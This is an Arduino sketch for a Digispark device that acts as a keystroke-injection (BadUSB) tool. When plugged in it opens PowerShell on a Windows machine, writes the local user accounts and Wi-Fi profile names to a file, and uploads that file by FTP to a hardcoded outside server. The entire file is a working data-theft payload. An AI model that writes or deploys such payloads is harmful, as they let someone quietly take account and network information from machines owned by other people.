#include "DigiKeyboardDe.h"    

void setup(){    
    DigiKeyboardDe.delay(3000);
    DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);    
    DigiKeyboardDe.delay(200);   
    DigiKeyboardDe.println("powershell"); 
    DigiKeyboardDe.delay(1000); 
    DigiKeyboardDe.println("New-Item infos.txt");  
    DigiKeyboardDe.delay(500);
    DigiKeyboardDe.println("Get-LocalUser | Add-Content infos.txt"); 
    DigiKeyboardDe.delay(500);
    DigiKeyboardDe.println("netsh wlan show profiles | Add-Content infos.txt"); 
    DigiKeyboardDe.delay(500);
    DigiKeyboardDe.println("$file = \"infos.txt\"; $ftpuri = \"ftp://testuser:testuser@192.168.178.22/infos.txt\"; $webclient = New-Object System.Net.WebClient; $uri = New-Object System.Uri($ftpuri)");
    DigiKeyboardDe.delay(500);
    DigiKeyboardDe.println("$webclient.UploadFile($uri, $file)");
}    
void loop(){    
}   
